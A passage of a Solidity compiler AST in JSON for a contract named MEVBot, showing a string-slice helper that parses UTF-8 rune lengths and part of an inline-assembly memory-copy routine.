															"referencedDeclaration": 363,
															"src": "4955:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 375,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4959:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "4955:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 384,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 382,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 363,
																"src": "5004:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 383,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5008:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "5004:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 394,
															"nodeType": "Block",
															"src": "5050:30:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 392,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 390,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 360,
																			"src": "5064:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 391,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5068:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "5064:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 393,
																	"nodeType": "ExpressionStatement",
																	"src": "5064:5:0"
																}
															]
														},
														"id": 395,
														"nodeType": "IfStatement",
														"src": "5001:79:0",
														"trueBody": {
															"id": 389,
															"nodeType": "Block",
															"src": "5014:30:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 387,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 385,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 360,
																			"src": "5028:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 386,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5032:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "5028:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 388,
																	"nodeType": "ExpressionStatement",
																	"src": "5028:5:0"
																}
															]
														}
													},
													"id": 396,
													"nodeType": "IfStatement",
													"src": "4952:128:0",
													"trueBody": {
														"id": 381,
														"nodeType": "Block",
														"src": "4965:30:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 379,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 377,
																		"name": "l",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 360,
																		"src": "4979:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 378,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "4983:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "4979:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 380,
																"nodeType": "ExpressionStatement",
																"src": "4979:5:0"
															}
														]
													}
												},
												"id": 397,
												"nodeType": "IfStatement",
												"src": "4902:178:0",
												"trueBody": {
													"id": 373,
													"nodeType": "Block",
													"src": "4916:30:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 371,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 369,
																	"name": "l",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 360,
																	"src": "4930:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 370,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4934:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "4930:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 372,
															"nodeType": "ExpressionStatement",
															"src": "4930:5:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 401,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 398,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 360,
														"src": "5136:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 399,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 331,
															"src": "5140:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 400,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "5140:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5136:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 425,
												"nodeType": "IfStatement",
												"src": "5132:153:0",
												"trueBody": {
													"id": 424,
													"nodeType": "Block",
													"src": "5151:134:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 407,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 402,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 333,
																		"src": "5165:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 404,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 37,
																	"src": "5165:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 405,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 331,
																		"src": "5177:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 406,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 37,
																	"src": "5177:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5165:21:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 408,
															"nodeType": "ExpressionStatement",
															"src": "5165:21:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 414,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 409,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 331,
																		"src": "5200:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 411,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 39,
																	"src": "5200:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 412,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 331,
																		"src": "5213:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 413,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 37,
																	"src": "5213:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5200:22:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 415,
															"nodeType": "ExpressionStatement",
															"src": "5200:22:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 420,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 416,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 331,
																		"src": "5236:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 418,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 37,
																	"src": "5236:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 419,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5248:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "5236:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 421,
															"nodeType": "ExpressionStatement",
															"src": "5236:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 422,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 333,
																"src": "5270:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																	"typeString": "struct MEVBot.slice memory"
																}
															},
															"functionReturnParameters": 337,
															"id": 423,
															"nodeType": "Return",
															"src": "5263:11:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 430,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 426,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 331,
															"src": "5295:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 428,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 39,
														"src": "5295:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 429,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 360,
														"src": "5308:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5295:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 431,
												"nodeType": "ExpressionStatement",
												"src": "5295:14:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 436,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 432,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 331,
															"src": "5319:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 434,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "5319:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "-=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 435,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 360,
														"src": "5332:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5319:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 437,
												"nodeType": "ExpressionStatement",
												"src": "5319:14:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 442,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 438,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 333,
															"src": "5343:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 440,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "5343:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 441,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 360,
														"src": "5355:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5343:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 443,
												"nodeType": "ExpressionStatement",
												"src": "5343:13:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 444,
													"name": "rune",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 333,
													"src": "5373:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
														"typeString": "struct MEVBot.slice memory"
													}
												},
												"functionReturnParameters": 337,
												"id": 445,
												"nodeType": "Return",
												"src": "5366:11:0"
											}
										]
									},
									"documentation": null,
									"id": 447,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "nextContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 334,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 331,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 447,
												"src": "4524:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 330,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "4524:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 333,
												"mutability": "mutable",
												"name": "rune",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 447,
												"src": "4543:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 332,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "4543:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4523:38:0"
									},
									"returnParameters": {
										"id": 337,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 336,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 447,
												"src": "4585:12:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 335,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "4585:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4584:14:0"
									},
									"scope": 1583,
									"src": "4502:882:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 486,
										"nodeType": "Block",
										"src": "5450:475:0",
										"statements": [
											{
												"body": {
													"id": 472,
													"nodeType": "Block",
													"src": "5525:136:0",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "5548:56:0",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"name": "dest",
																					"nodeType": "YulIdentifier",
																					"src": "5573:4:0"
																				},
																				{
																					"arguments": [
																						{
																							"name": "src",
																							"nodeType": "YulIdentifier",
																							"src": "5585:3:0"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "5579:5:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "5579:10:0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "5566:6:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "5566:24:0"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "5566:24:0"
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 449,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5573:4:0",
																	"valueSize": 1
																},
																{
																	"declaration": 451,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5585:3:0",
																	"valueSize": 1
																}
															],
															"id": 463,
															"nodeType": "InlineAssembly",
															"src": "5539:65:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 466,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 464,
																	"name": "dest",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 449,
																	"src": "5617:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 465,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5625:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5617:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 467,
															"nodeType": "ExpressionStatement",
															"src": "5617:10:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 470,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 468,
																	"name": "src",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 451,
																	"src": "5641:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 469,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5648:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5641:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 471,
															"nodeType": "ExpressionStatement",
															"src": "5641:9:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 458,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 456,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 453,
														"src": "5503:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3332",
														"id": 457,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5510:2:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_32_by_1",
															"typeString": "int_const 32"
														},
														"value": "32"
													},
													"src": "5503:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 473,
												"initializationExpression": null,
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 461,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 459,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 453,
															"src": "5514:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "-=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 460,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5521:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "5514:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 462,
													"nodeType": "ExpressionStatement",
													"src": "5514:9:0"
												},
												"nodeType": "ForStatement",
												"src": "5497:164:0"
											},
											{
												"assignments": [
													475
												],
												"declarations": [
													{
														"constant": false,
														"id": 475,
														"mutability": "mutable",
														"name": "mask",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 486,
														"src": "5703:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 474,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5703:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 484,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 483,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 481,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "323536",
															"id": 476,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5715:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_256_by_1",
																"typeString": "int_const 256"
															},
															"value": "256"
														},
														"nodeType": "BinaryOperation",
														"operator": "**",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 479,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"hexValue": "3332",
																		"id": 477,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5723:2:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_32_by_1",
																			"typeString": "int_const 32"
																		},
																		"value": "32"
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 478,
																		"name": "len",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 453,
																		"src": "5728:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
